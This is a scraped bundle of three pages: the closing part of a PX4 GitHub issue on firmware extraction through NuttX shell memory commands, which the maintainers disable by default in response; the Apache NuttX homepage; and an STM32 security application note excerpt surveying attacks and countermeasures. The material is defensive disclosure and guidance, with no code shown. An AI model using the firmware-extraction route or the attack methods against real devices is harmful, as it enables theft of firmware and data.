| I think "mw"-like commands should be disabled or adequately inform of their potential threats.  It is true that giving NSH access to users provides full access to the system. Yet, the intent of commercial vendor developers (e.g., Yuneec) is still to protect firmware from extraction because: (1) They decided to use "readout" protection, making it impossible to read firmware even if using a debugger. (2) They did not expose the command shell interface, such as UART  Nevertheless, such developers may not be aware that there is a detour to extract the firmware described in this issue post. Even though developers enabled "readout" protection, their efforts are neutralized by "mw"-like command exploitation. I believe noticing this security issue makes developers prevent the vulnerability.  For that reason, I would suggest that "mw"-like commands may be disabled at default (or should provide some warning messages for it). If the developers need to use that, they may enable such commands explicitly. |
| --- |

All reactions

Sorry, something went wrong.

[![@swkim101](https://avatars.githubusercontent.com/u/72803908?s=80&u=315a809037b8e23ed194894a863fc8ebda331245&v=4)](/swkim101)

Copy link

Author

### **[swkim101](/swkim101)** commented [Mar 29, 2021](#issuecomment-808987199)

| [@LorenzMeier](https://github.com/LorenzMeier), You can see that the Nuttx community has decided to disable the mw-like commands by default at the following link: [apache/nuttx#3011](https://github.com/apache/nuttx/issues/3011) |
| --- |

All reactions

Sorry, something went wrong.

[![@dagar](https://avatars.githubusercontent.com/u/84712?s=80&v=4)](/dagar)

Copy link

Member

### **[dagar](/dagar)** commented [Mar 29, 2021](#issuecomment-809005904)

| I'm not aware of typical users/developers actually using these on a regular basis, so I'd be fine with disabling them by default (saving a little bit of flash). I'll open a PR and give it a bit of time for any objections. |
| --- |

All reactions

Sorry, something went wrong.

[![@dagar](https://avatars.githubusercontent.com/u/84712?s=40&v=4)](/dagar)
[dagar](/dagar)
self-assigned this
[Mar 29, 2021](#event-4518845364)

[dagar](/dagar)
added a commit
that referenced
this issue
[Mar 29, 2021](#ref-commit-555f900)
[![@dagar](https://avatars.githubusercontent.com/u/84712?s=40&v=4)](/dagar)

`[boards: NuttX disable all NSH memory debug commands (mb, mh, mw) by d…](/PX4/PX4-Autopilot/commit/555f900cf52c0057e4c429ff3699c91911a21cab "boards: NuttX disable all NSH memory debug commands (mb, mh, mw) by default

 - closes https://github.com/PX4/PX4-Autopilot/issues/17062")`
…

`[555f900](/PX4/PX4-Autopilot/commit/555f900cf52c0057e4c429ff3699c91911a21cab)`

```
…efault

 - closes [#17062](https://github.com/PX4/PX4-Autopilot/issues/17062)
```

[![@dagar](https://avatars.githubusercontent.com/u/84712?s=40&v=4)](/dagar)
[dagar](/dagar)
mentioned this issue
[Mar 29, 2021](#ref-pullrequest-843477682)

[boards: NuttX disable all NSH memory debug commands (mb, mh, mw) by default
#17264](/PX4/PX4-Autopilot/pull/17264)
 Merged

[![@dagar](https://avatars.githubusercontent.com/u/84712?s=80&v=4)](/dagar)

Copy link

Member

### **[dagar](/dagar)** commented [Mar 29, 2021](#issuecomment-809467244)

| Pull request - [#17264](https://github.com/PX4/PX4-Autopilot/pull/17264) |
| --- |

All reactions

Sorry, something went wrong.

[![@dagar](https://avatars.githubusercontent.com/u/84712?s=40&v=4)](/dagar)
[dagar](/dagar)
closed this as [completed](/PX4/PX4-Autopilot/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
in
[#17264](/PX4/PX4-Autopilot/pull/17264)
[Mar 30, 2021](#event-4527634248)

[dagar](/dagar)
added a commit
that referenced
this issue
[Mar 30, 2021](#ref-commit-6874e9f)
[![@dagar](https://avatars.githubusercontent.com/u/84712?s=40&v=4)](/dagar)

`[boards: NuttX disable all NSH memory debug commands (mb, mh, mw) by d…](/PX4/PX4-Autopilot/commit/6874e9fba03bbec52da09f134563f644f9299ca8 "boards: NuttX disable all NSH memory debug commands (mb, mh, mw) by default

 - closes https://github.com/PX4/PX4-Autopilot/issues/17062")`
…

`[6874e9f](/PX4/PX4-Autopilot/commit/6874e9fba03bbec52da09f134563f644f9299ca8)`

```
…efault

 - closes [#17062](https://github.com/PX4/PX4-Autopilot/issues/17062)
```

[![@swkim101](https://avatars.githubusercontent.com/u/72803908?s=80&u=315a809037b8e23ed194894a863fc8ebda331245&v=4)](/swkim101)

Copy link

Author

### **[swkim101](/swkim101)** commented [Apr 8, 2021](#issuecomment-815464810)

| Acknowledgment: This vulnerability was found out by the following people (alphabetical order):   * Gisu Yeo wcharcode@gmail.com * Sungwoo Kim kim3583@purdue.edu * Taegyu Kim tgkim@purdue.edu |
| --- |

All reactions

Sorry, something went wrong.

[![@junwoo091400](https://avatars.githubusercontent.com/u/23277211?s=40&u=a499aac70c035f356ca44937c06a7d196f00776c&v=4)](/junwoo091400)
[junwoo091400](/junwoo091400)
added
the
[priority-critical](/PX4/PX4-Autopilot/labels/priority-critical)
label
[Dec 4, 2023](#event-11133547090)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FPX4%2FPX4-Autopilot%2Fissues%2F17062)

Assignees

[![@dagar](https://avatars.githubusercontent.com/u/84712?s=40&v=4)](/dagar) [dagar](/dagar)

Labels

[priority-critical](/PX4/PX4-Autopilot/labels/priority-critical)

Projects

None yet

Milestone

No milestone

Development

Successfully merging a pull request may close this issue.

 [boards: NuttX disable all NSH memory debug commands (mb, mh, mw) by default](/PX4/PX4-Autopilot/pull/17264)
 [PX4/PX4-Autopilot](/PX4/PX4-Autopilot)

4 participants

[![@dagar](https://avatars.githubusercontent.com/u/84712?s=52&v=4)](/dagar) [![@LorenzMeier](https://avatars.githubusercontent.com/u/1208119?s=52&v=4)](/LorenzMeier) [![@junwoo091400](https://avatars.githubusercontent.com/u/23277211?s=52&v=4)](/junwoo091400) [![@swkim101](https://avatars.githubusercontent.com/u/72803908?s=52&v=4)](/swkim101)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from nuttx.apache.org_dfe1da68_20250114_204341.html ===

Toggle navigation

[![](/assets/themes/apache/img/logo.png)
Apache NuttX](/)

* Community
  + [Get Involved](/community)
  + [Who we are](/community-members)
* [Events](https://events.nuttx.apache.org)
* [Documentation](/docs/latest)
* [GitHub](https://github.com/apache/nuttx)
* Apache
  + [Apache Software Foundation](https://www.apache.org/foundation/how-it-works.html)
  + [License](https://www.apache.org/licenses/)
  + [Security](https://www.apache.org/security/)
  + [Privacy](https://privacy.apache.org/policies/privacy-policy-public.html)
  + [Events](https://www.apache.org/events/current-event)
  + [Sponsorship](https://www.apache.org/foundation/sponsorship.html)
  + [Thanks](https://www.apache.org/foundation/thanks.html)

# Apache NuttX

Apache NuttX is a mature, real-time embedded operating system (RTOS).

[Get NuttX](/download)

## Apache NuttX

NuttX is a real-time operating system (RTOS) with an emphasis on standards
compliance and small footprint. Scalable from 8-bit to 64-bit microcontroller
environments, the primary governing standards in NuttX are Posix and ANSI
standards. Additional standard APIs from Unix and other common RTOSâs (such as
VxWorks) are adopted for functionality not available under these standards, or
for functionality that is not appropriate for deeply-embedded environments (such
as fork()).

## Documentation

Extensive documentation can be found [here](/docs/latest).

## Online Demo

Try the online demo [here](/demo).

## Community Events

### International Workshop 2024

The [Apache NuttX International Workshop](https://events.nuttx.apache.org)
is organized every year. You can attend online or in person for free.
This year we meet on 13-14 Jun 2024 at Sony Office, Tokyo, Japan. See you there!

Please visit [events website](https://events.nuttx.apache.org) for more details.
You can join the event at [LinkedIn](https://www.linkedin.com/events/7165682114275876869).
[Call For Papers](https://docs.google.com/forms/d/1eAvddku9WaNn0au2QJEkOdChq4XxPP6Sj0EgIfmDXS0/edit) is now open!

The scope of the workshop is the Apache NuttxÂ® Real Time Operating System, the
tools used for its design, development, deployment, debugging, and maintenance,
the applications that use it, and the hardware on which it typically runs.
The target audience is embedded systems practitioners across both industry and
academia.

---

[![Apache Software Foundation, Est. 1999](/assets/themes/apache/img/asf-estd-1999-logo.png)](https://www.apache.org)

Copyright © 2019-2024 [The Apache Software Foundation](https://www.apache.org).
Licensed under the [Apache License, Version
2.0](https://www.apache.org/licenses/LICENSE-2.0).

Apache and the Apache Feather logo are trademarks of The Apache Software Foundation.



=== Content from www.st.com_57965bb8_20250114_204352.html ===
AN5156

Application note

Introduction to security for STM32 MCUs

Introduction

This application note presents the basics of security in STM32 microcontrollers.

Security in microcontrollers encompasses several aspects including protection of firmware intellectual property, protection of
private data in the device, and guarantee of a service execution.

The context of IoT has made security even more important. The huge number of connected devices makes them an attractive
target for attackers and several remote attacks have shown the vulnerabilities of device communication channels. With IoT, the
security extends the requirements for confidentiality and authentication to communication channels, which often require
encryption.

This document is intended to help the building of a secure system by applying countermeasures to different types of attack.

In the first part, after a quick overview of different types of threats, examples of typical attacks are presented to show how
attackers exploit the different vulnerabilities in an embedded system.

The subsequent sections focus on the set of hardware and software protections that defend the system from these attacks.

The last sections list all security features available in the STM32 Series, and guidelines are given to build a secure system.

Type

Microcontrollers

Table 1. Applicable products

Product series

STM32C0 Series, STM32F0 Series, STM32F1 Series, STM32F2 Series, STM32F3 Series, STM32F4 Series,
STM32F7 Series, STM32G0 Series, STM32G4 Series, STM32H5 Series, STM32H7 Series, STM32L0 Series,
STM32L1 Series, STM32L4 Series, STM32L4+ Series, STM32L5 Series, STM32U5 Series, STM32WB Series,
STM32WBA Series, STM32WL Series, STM32U0 Series, STM32WB0 Series.

AN5156 - Rev 10 - March 2024
For further information contact your local STMicroelectronics sales office.

www.st.com

1

General information

This document applies to STM32 Arm® Cortex®-core based microcontrollers.

Note:

Arm is a registered trademark of Arm limited (or its subsidiaries) in the US and/or elsewhere.

AN5156
General information

The table below presents a nonexhaustive list of the acronyms used in this document and their definitions.

Table 2. Glossary

Definition

Advanced encryption standard

Core-coupled memory (SRAM)

Central processing unit–core of the microcontroller

Clock security system

Denial of service (attack)

Term

AES

CCM

CPU

CSS

DoS

DRNG

Deterministic random number generator: generates pseudo-random number from input value

DPA

ECC

FIA

FIB

Differential power analysis

Error code correction

Fault injection attack

Focused ion beam

GTZC

Global TrustZone® controller

HDP

HUK

IAP

IAT

IoT

IV

Secure hide protection

Hardware unique key

In-application programming

Initial attestation token

Internet of things

Initialization vector (cryptographic algorithms)

IWDG

Independent watchdog

MAC

MCU

Message authentication code

Microcontroller unit (STM32 Arm® Cortex®-M based devices)

MPCBB

Memory protection block-based controller

MPCWM

Memory protection watermark-based controller

MPU

NSC

NVM

Memory protection unit

Nonsecure callable

Nonvolatile memory

OTFDEC

On-the-fly decryption

OTP

One-time programmable

PCROP

Proprietary code readout protection

PKA

PSA

PVD

Public key algorithm (also named aka asymmetric algorithm)

Platform security architecture

Programmable voltage detector

AN5156 - Rev 10

page 2/59

AN5156
General information

Term

Definition

PWR

ROM

RoT

RDP

RSS

RTC

SAU

SB

SCA

Power control

Read only memory–system flash memory in STM32

Root of trust

Read protection

Root secure services

Real-time clock

Security attribution unit

Secure boot

Side channel attack

SDRAM

Synchronous dynamic random access memory

SECDED

ECC mode of operation: single error correct, double error detect

SFI

SFU

SPA

SPE

Secure firmware installation

Secure firmware update

Simple power analysis

Secure processing environment

SRAM

Static random access memory (volatile)

SST

Secure storage

STSAFE

Secure element product from STMicroelectronics portfolio

SWD

TF-M

WRP

Serial-wire debug

Trusted firmware-M

Write protection

AN5156 - Rev 10

page 3/59

AN5156
General information

Documentation references
The reference manual of each device gives details on the availability of security features. It also informs about
memory protections implementation.
A programming manual is also available for each Arm® Cortex® version and can be used for an MPU (memory
protection unit) description:

•

•

•

•

•

STM32 Cortex®-M33 MCUs programming manual (PM0264)
STM32F7 series and STM32H7 series Cortex®-M7 processor programming manual (PM0253)
STM32 Cortex®-M4 MCUs and MPUs programming manual (PM0214)
STM32F10xxx/20xxx/21xxx/L1xxxx Cortex®-M3 programming manual (PM0056)
Cortex®-M0+ programming manual for STM32L0, STM32G0, STM32WL, STM32WB, and STM32WB0
series (PM0223)

Refer to the following set of user manuals and application notes (available on www.st.com) for detailed
description of security features:

Ref.

Doc
number

Title

Comment

[1]

AN4246

Proprietary code readout protection on
STM32L1 series MCUs

[2]

AN4701

Proprietary code readout protection on
STM32F4 series MCUs

[3]

AN4758

Proprietary code readout protection on
STM32L4, STM32L4+, STM32G4,
and STM32WB series MCUs

[4]

AN4968

Proprietary code readout protection on
STM32F72/F73xx MCUs

[5]

AN4838

Managing memory protection unit
(MPU) in STM32 MCUs

Explains how to set up and work with PCROP firmware for the
specified MCUs, provided with the X‑CUBE‑PCROP expansion
package.

Describes how to manage the MPU in the STM32 products.

[6]

AN5185

STMicroelectronics firmware upgrade
services for STM32WB series

[7]

AN5447

Overview of secure boot and secure
firmware update solution on Arm®
TrustZone® STM32 MCUs

-

-

[8]

UM1924

Legacy STM32 crypto library

Describes the API of the STM32 crypto library; provided with the
X‑CUBE‑CRYPTOLIB expansion package.

[9]

UM2262

Getting started with the X-CUBE-
SBSFU STM32Cube expansion
package

Presents the SB (secure boot) and SFU (secure firmware update)
STMicroelectronics solutions; provided with the X‑CUBE‑SBSFU
expansion package.

[10]

AN4730

Using the firewall embedded in
STM32L0/L4/L4+ series MCUs

Describes how to access securely sensitive parts of code and
data

AN5156 - Rev 10

page 4/59

AN5156
Overview

2

Overview

2.1

Security purpose

Why protection is needed

Security in microcontrollers means protecting embedded firmware, data, and the system functionality. The need
for data protection is greatest in the case of cryptographic keys or personal data.
The firmware code is also an important asset. If an attacker gains access to the binary, they can reverse-engineer
the program in an attempt to find further vulnerabilities, bypass licensing and software restrictions. The attacker
can copy any custom algorithms, or even use it to flash a clone of the hardware. Even in the case of open-source
software, it makes sense to attest that the code is authentic, and not replaced by malicious firmware.
Denial-of-service attack (DoS attack) is another major threat when considering protection systems (such as
environmental: gas, fire, or intrusion), detection alarms or surveillance cameras. The system functionality must be
robust and reliable.

The requirement for security must not be underestimated even if it adds more complexity to the system. Today,
systems built around microcontrollers become potential targets for more and more skilled attackers who expect
financial gains. These gains can be very high, especially if the attack can be propagated to a large scale, as in the
context of the IoT. Even if no system is completely secure, it is possible to make the attack more expensive.
Indeed IoT, or smart devices, have increased the requirement for security. Connected devices are very attractive
for hackers because they are remotely accessible. The connectivity offers an angle-of-attack through protocol
vulnerabilities. In the case of a successful attack, a single compromised device can jeopardize the integrity of an
entire network (see the figure below).

Figure 1. Corrupted connected device threat

Services provider

Unsecure
Unsecure
Device
Device

Corrupted system

Attack propagation

Device
Device

Device
Device

Device
Device

1
V
2
4
9
0
5
T
D

AN5156 - Rev 10

page 5/59

AN5156
Overview

What must be protected

Security cannot be limited to a certain target or asset. It is difficult to protect data if the code binary is exposed.
Both the attacks and the protection mechanisms often do not make difference. However it is still useful to
summarize the assets and risks.
The table below presents a non-exhaustive list of assets targeted by attackers.

Table 3. Assets to be protected

Target

Assets

Risks

Data

Sensor data (such as healthcare data or log of positions)

Unauthorized sale of personal data

User data (such as ID, PIN, password or accounts)

Usurpation

Transactions logs

Cryptographic keys

Spying

Blackmail

Control of device (bootloader,
malicious application)

Device correct functionality

Device/user identity

Device hardware architecture/design

User code

Software patent/architecture

Technology patents

Denial of service

Attacks on service providers

Fraudulent access to service (cloud)

Device counterfeit

Software counterfeit

Software modification

Access to secure areas

Vulnerability, threat, and attack

Protection mechanisms have to deal with different threats. The objective is to remove vulnerabilities that could be
exploited in an attack. An overview of main attack types are presented in Section 3: Attack types, from the basic
ones to the most advanced ones.
The following specific wording is used around security:

•
•
•

asset: what needs to be protected
threat: what the device/user need to be protected against
vulnerability: weakness or gap in a protection mechanism

In summary, an attack is the realization of a threat that exploits a system vulnerability in order to access an asset.

AN5156 - Rev 10

page 6/59

AN5156
Attack types

3

Attack types

This section presents the different types of attack that a microcontroller may have to face, from the most basic
ones to very sophisticated and expensive ones. The last part presents typical examples of attacks targeting
an IoT system.
Attacks on microcontroller are classified in one of the following types:

•
•
•

software attack: exploits software vulnerabilities (such as bug or protocol weaknesses).
hardware non-invasive attack: focuses on MCU interfaces and environment information.
hardware invasive attack: destructive attack with direct access to silicon

3.1

Introduction to attack types
A key rule in security is that a successful attack is always possible.
First, there is no absolute protection against unexpected attack. Whatever the security measures taken to protect
a system, it is possible that a security breach is found and exploited during the device lifetime. This last point
makes it necessary to consider how the device firmware is updated to increase its security
(see Section 5.3.2: Secure firmware update (SFU)).
Secondly, in laboratory conditions with proper equipment, it is possible to retrieve microcontroller content, or even
its design architecture details. These techniques are briefly presented in Section 3.3: Hardware attacks.
From an attacker's point of view, an attack is most profitable if the ratio expected revenue/attack cost is as high as
possible. The revenue depends on the stolen asset value, and on the repeatability of the attack. The cost
depends on time, the acquisition of the necessary skills by the attacker, and on money (equipment) spent to
succeed.

Attack types

While there are more detailed groups and categories of attack, the basic categories are the following ones:

•

•

Software attacks are carried by exploiting bugs, protocol weaknesses, or untrusted pieces of code among
others. Attacks on communication channels (interception or usurpation) are part of this category. Software
attacks represent the vast majority of cases. Their cost may be very low. They can be widely spread and
repeated with huge damage. It is not necessary to have a physical access to the device. The attack can be
executed remotely.
Hardware attacks need physical access to the device. The most obvious one exploits the debug port, if it
is not protected. However, in general, hardware attacks are sophisticated and can be very expensive. They
are carried out with specific materials and require electronics engineering skills. A distinction is made
between noninvasive attacks (carried out at board or chip level without device destruction), and invasive
attacks (carried out at device-silicon level with package destruction). In most cases, such an attack is only
profitable if it reveals information that leads to a new and widely applicable remote attack.

AN5156 - Rev 10

page 7/59

The table below gives an overview of the cost and techniques used for each type of attack.

AN5156
Attack types

Table 4. Attacks types and costs

Non-invasive

Semi–invasive

Invasive

Attacks
types

-

Scope

Remote or local

Local board and device level

Local device level

Techniques

Software bugs

Protocol weaknesses

Trojan horse

Eavesdropping

Debug port

Power glitches

Fault injection

Probing

Laser

FIB

Side-channels analysis

Reverse engineering

Cost/
expertise

From very low to high,
depending on the security
failure targeted

Quite low cost. Need only moderately
sophisticated equipment and knowledge to
implement.

Very expensive. Need dedicated
equipment and very specific skills.

Access to confidential assets
(code and data).

Objectives

Usurpation

Denial of service

Access to secret data or device internal
behavior (algorithm).

Reverse engineering of the device
(silicon intellectual property)

Access to hidden hardware and
software secrets (flash memory
access)

3.2

Software attacks
Software attacks are carried out on the system by executing a piece of code, named a malware, by the CPU.
The malware takes control of the device in order to get access to any resources of the system (such as ID, RAM,
and flash memory content or peripheral registers), or to modify its functionality.
This type of attack represents most of device threats for the following reasons:

•
•

The attack cost is low since it does not need specific equipment but a personal computer.
Many hackers can put their effort together, sharing their expertise and tricks, so that a successful attack is
likely to happen if a security breach exists. Furthermore, in case of success, the attack protocol may
spread very quickly through the web

The malware can be injected into the device or can already be present (insider threat) in main application
firmware through a nonverified or untrustworthy library for example. Malwares are of many types and they can be
very small and easy to hide.
Here are examples of what a malware can do:

•
•
•
•
•
•
•

Modify device configuration (such as option bytes or memory attributes).
Disable protections.
Read memory and dump its content for firmware and data cloning.
Trace or log device data.
Access to cryptographic items.
Open communication channel/interface.
Modify or block the device functionality.

Unless user application is fully trusted, bug-free, and isolated, without any means to communicate with external
world, software attacks must be considered.

AN5156 - Rev 10

page 8/59

AN5156
Attack types

Malware injection

There are various methods to inject a piece of code inside the system. The size of the malware depends on the
target but may be very small (few tens of bytes). To be executed, the malware must be injected in the device
memory (RAM or flash memory). Once injected, the challenge is to have it executed by the CPU, which means
that the PC (program counter) must branch to it.
Methods of injecting malware can be categorized as follows:

•

basics device access/"open doors”:

–
–
–

Debug port: JTAG or SWD interface
Bootloader: if accessible, can be used to read/write memory content through any available interface.
Execution from external memory

These malware injections are easy to counter with simple hardware mechanisms that are described
in Section 4: Device protections .
Application download:

–
–

Firmware update procedure: a malware can be transferred instead of a new FW.
OS with capability to download new applications

This category countermeasure is based on authentication between the device and the server or directly
with code authentication. Authentication relies on cryptography algorithms.
Weaknesses of communication ports and bugs exploitation:

–

–

Execution of data. Sometimes it is possible to sneak the malware in as data, and to exploit incorrect
boundary check to execute it.
Stack-based buffer overflows, heap-based buffer overflows, jump-to-libc attacks, and data-only
attacks

This third category is by definition difficult to circumvent. Most embedded system applications are coded
using low-level languages such as C/C++. These languages are considered unsafe because they can lead
to memory management errors leveraged by attackers (such as stack, heap, or buffers overflow). The
general idea is to reduce as much as possible what is called the attack surface, by minimizing the
untrusted or unverified part of firmware. One solution consists in isolating the execution and the resources
of the different processes. For example, the TF-M includes such a mechanism.
Use of untrusted libraries with device back door:
This last category is an intentional malware introduction that facilitates device corruption. Today, lot of
firmware developments rely on software shared on the web and complex ones can hide Trojan horses. As
in previous category, the way to countermeasure this threat is to reduce the surface attack by isolating as
much as possible the process execution and protecting the critical code and data.

•

•

•

Brute forcing

This type of attack targets the authentication based on a shared secret. A secure device may require a session
authentication before accessing services (in the cloud for example) and a human machine interface (HMI) can be
exploited with an automatic process in order to try successive passwords exhaustively.
Interesting countermeasures are listed below:

•

•
•

Limit the number of login trials with a monotonic counter (implemented with a timer, or if possible, with a
backup domain).
Increase the delay between consecutive login attempts.
Add a challenge-response mechanism to break automatic trials.

3.3

Hardware attacks
Hardware attacks require a physical access to the device or, often, to several devices in parallel.
The two following types of attacks differ in cost, time, and necessary expertise:

•

•

Non-invasive attacks have only external access to the device (board-level attack) and are moderately
expensive (thousands to tens of thousands US dollars in equipment).
Invasive attacks have direct access to device silicon (after de-packing). They are carried out with advanced
equipment often found in specialized laboratories. They are very expensive (more than 100k dollars, and
often in the range of millions) and target very valuable data (Keys or IDs) or even the protection technology
itself.

AN5156 - Rev 10

page 9/59

AN5156
Attack types

General-purpose microcontrollers are not the best candidates to counter the most advanced physical attacks.
If a highest protection level is required, consider pairing a secure element with the general-purpose
microcontroller. Secure elements are dedicated microcontrollers certified as per the latest security standards with
specific hardware.
Refer to ST secure microcontrollers web page.

3.3.1

Non-invasive attacks
Non-invasive, or board-level attacks try to bypass the protection without physical damage (device kept functional).
Only accessible interfaces and device environment are used. These attacks require moderately sophisticated
equipment and engineering skills (such as signal processing).

Debug port access

This is the most basic attack that can be carried out on a device. Disabling debug capability must be the first
protection level to consider. Indeed, accessing to debug port or scan chain through JTAG or SWD protocol allows
accessing the full internal resources of the device: CPU registers, embedded flash memory, RAM and peripheral
registers.
Countermeasure:

•
•

Debug port deactivation or fuse through Readout protection (RDP)
Life-cycle management using product state (where this technology succeeded the RDP)

Serial port access

Access to communication ports (such as I2C or SPI) may hide a weakness that can be exploited. Communication
ports can be spied or used as a device entry point. Depending on how the associated protocol are implemented
(such as memory address access range, targeted peripherals or read/write operations), an attacker can
potentially gain access to the device resources.
Countermeasures:

•

Software:

Associated protocol operations must be limited by the firmware level, so that no sensitive resources
can be read or written.
Isolate communication stack from sensitive data.
Length of data transfer must be checked to avoid buffer overflows.
Communication can be encrypted with a shared key between the device and the target.

–

–
–
–
Hardware:

•

–
–

Physical communication port can be buried in multi-layer boards to make it more difficult to access.
Unused interface port must be deactivated.

Fault injection: clock and power disturbance/glitch attacks

Fault injection consists in using the device outside the parameters defined in the datasheet to generate
malfunctions in the system. A successful attack can modify the program behavior in different ways such as
corrupting program state, corrupting memory content, stopping process execution (“stuck-at fault”), skipping
instruction, modifying conditional jump or providing unauthorized access.
The typical threats involve tampering with clock (freezing or glitch) and power (under/over voltage or glitch). Since
fault may be non‑intentional, countermeasures are the same as the one used for safety: redundancy, error
detection and monitoring.

AN5156 - Rev 10

page 10/59

AN5156
Attack types

Countermeasures:

•

Software:

–
–
–

–

Check function return values.
Use strict comparisons when branching.
Make sure that no code was skipped in critical parts by incrementing a dedicated variable in each
branch with prime number and check for the expected value.
Use non-trivial values as true and false (avoid comparing to 0 or -1, try complex values with high
mutual Hamming distance).

•

Hardware:

–
–
–
–

Use Clock security system (CSS) if available.
Use internal clock sources.
Use internal voltage regulators.
Use memory error detection (ECC and parity).

Side-channel attacks (SCA)

When a firmware is executed, an attacker can observe the device running characteristics (such as power
consumption, electromagnetic radiations, temperature or activity time). This observation can bring enough
information to retrieve secret assets such as data values and/or algorithms implementation. Side-channel based
attacks are powerful against cryptographic devices in order to reveal the keys used by the system. SPA (simple
power analysis) and DPA (differential power analysis) are typical example of side-channel attack exploiting power
consumption.
Countermeasures:

•

•

Software:

–
–

Limit key usage: use session random keys when possible.
Use protected cryptographic libraries with behavioral randomization (such as delays or fake
instructions).

Hardware:

–

Shields against monitoring can be found in secure elements (STSAFE), but there is usually no
efficient hardware countermeasure embedded in general-purpose microcontrollers (except for the
SAES in STM32H5 and STM32U5 devices, the hardware protection in limited in general-purpose
microcontrollers. The protection level is reflected by the certification level achieved by the device.
See Section 5.6: Product certifications for more details).

Silicon invasive attacks
The cost of such attacks is very high; all means are considered to extract information of the device that is
destroyed during the process. The attacker needs to obtain a substantial quantity of devices to be successful.
Carried out with expensive equipments often found in specialized laboratories, they require a high level of skills
and knowledge, as well as time.
Invasive attacks start with the removal of the device package. An initial analysis can be done without eliminating
the passivation layer, however investigations with device interaction (probing) require its removal. De-packaging
can be done by chemical etching, drilling or by a laser cutter. Once the device is opened, it is possible to perform
probing or modification attacks.
Several ST microcontrollers dedicated to security offer robustness against such kind of treatments. These are not
part of the STM32 family and are out of scope of this document. Refer to ST secure hardware platforms
(www.st.com/en/secure-mcus.html).

Reverse engineering

The goal is to understand the inner structure of the device and analyze its functionality. This is quite a challenging
task with modern devices featuring millions of gates.
The first step is to create a map of the microcontroller. It can be done by using an optical microscope to produce a
high-resolution photograph of the device surface. Deeper layers can then be analyzed in a second step, after the
metal layers have been stripped off by etching the device.

3.3.2

AN5156 - Rev 10

page 11/59

AN5156
Attack types

Reading the data

When using the electron microscope, the data, represented by an electric charge, becomes visible. It is possible
to read the whole device memory.

Micro probing and internal fault injection

Micro probing consists in interacting with the device at metal layer level. Thin electrodes are used to establish an
electrical contact directly with the surface of the device so that the attacker can observe, manipulate, and interfere
with it while the device is running.

Device modification

More sophisticated tools can be used to perform attacks. FIB (focused ion beam) workstations, for example,
simplify the manual probing of deep metal and polysilicon lines. They also can be used to modify the device
structure by cutting existing or creating new interconnection lines and even new transistors.

3.4

IoT system attack examples
This section presents typical examples of attacks on an IoT system. Fortunately, most of these attacks can be
countered by enabling security feature (hardware countermeasures) and secure application architecture (software
countermeasures). The countermeasures are detailed in the next sections.
An IoT system is built around a STM32 microcontroller with connectivity systems (such as Ethernet, Wi-Fi®,
Bluetooth® Low Energy or ,LoRa®,) and sensors and/or actuators (see the figure below). The microcontroller
handles the application, data acquisition and communications with a cloud service. The microcontroller may also
be responsible for the system maintenance through firmware update and integrity check.

Figure 2. IoT system

Connectivity

STM32

Sensors

Actuators

1
V
6
4
9
0
5
T
D

AN5156 - Rev 10

page 12/59

AN5156
Attack types

3.5

List of attack targets
The following sections list the possible attack targets.

Initial provisioning

The cryptographic data for root of trust for the chain of security must be injected to the SoC in a controlled trusted
way. Whether it is a key, a certificate or a hash initial value, it must remain immutable and/or secret. Once
programmed inside the device, the data protection mechanism must be enabled and only authorized process
must have access to it.

•
•

Risks: firmware corruption or usurpation
Countermeasures:

–
–
–
–
–

trusted manufacturer environment
use of secure data provisioning services (SFI)
data protection mechanisms
secure application isolation
use of OTP memory

Boot modification

The purpose of this attack is to use the bootloader to access to device content. The attack aims at modifying the
boot mode and/or the boot address to preempt the user application and to take control of the CPU through the
bootloader (via USB DFU, I2C or SPI), the debug port or through a firmware injected in RAM. The boot mode and
the address are controlled by device configuration and/or input pin and must be protected.

•
•

Risks: full access of the microcontroller content
Countermeasures:

–
–

unique boot entry
bootloader and debug disabled (see Section 6.2: Readout protection (RDP))

Secure boot (SB) or Trusted Firmware-M (TF-M)

Robust systems rely on initial firmware integrity and authenticity check before starting the main application. As the
root of trust of a device, this part of user firmware must be immutable and impossible to bypass.
A successful attack consists in executing a non-trusted application by bypassing the verification and by jumping
directly to the malware. It can be done by hardware techniques such as fault-injection. It can also be done by
replacing the expected hash value by the hash value of the malware (refer to the Initial provisioning section at the
beginning of this chapter).

•
•

Risks: device spoofing or application modification
Countermeasures:

–
–
–
–

unique boot entry point to avoid verification bypass
"immutable code" to avoid SB code modification
secure storage of firmware signature and/or tag value
environment event detection (such as power supply glitch, temperature or clock speed)

Firmware update

The firmware update procedure allows a product owner to propose corrected version of the firmware to ensure
the best user experience during device lifetime. However, a firmware update gives an attacker an opportunity to
enter the device with its own firmware or a corrupted version of the existing firmware.
The process must be secured with firmware authentication and integrity verification. A successful attack requires
an access to the cryptographic procedure and keys (refer to the Initial provisioning section at the beginning of this
chapter).

•
•

Risk: device firmware corruption
Countermeasure: SFU application with authentication and integrity checks. Confidentiality can also be
added by encrypting the firmware in addition to signature.

AN5156 - Rev 10

page 13/59

AN5156
Attack types

Communication interfaces

Serial interfaces (such as SPI, I2C or USART) are used either by the bootloader or by applications to exchange
data and/or commands with the device. The interception of a communication allows an attacker to use the
interface as a device entry point. The firmware protocol can also be prone for bugs (like overflow).

•
•

Risk: Access to device content
Countermeasures:

–
–
–
–
–

Make physical bus hard to reach on board.
Isolate software communication stacks to prevent them from accessing critical data and operations.
Use cryptography for data exchange.
Disable I/F ports when not needed.
Check inputs carefully.

Debug port

The debug port provides access to the full content of the device: core and peripherals registers, flash memory and
SRAM content. Used for application development, it may be tempting to keep it alive for investigating future bugs.
This is the first breach tried by an attacker with physical access to the device.

•
•

Risk: full access to the device
Countermeasure: Disable device debug capabilities (see Section 6.2: Readout protection (RDP)).

External peripheral access

An IoT device controls sensors and actuators depending on the global application. An attacker can divert the
system by modifying data coming from sensors or by shunting output data going to actuators.

•
•

Risk: incorrect system behavior.
Countermeasure: anti-tamper to detect system intrusion at board level

Sensitive firmware and data

Some parts of the firmware need special protection: for example the cryptographic algorithm or a third-party
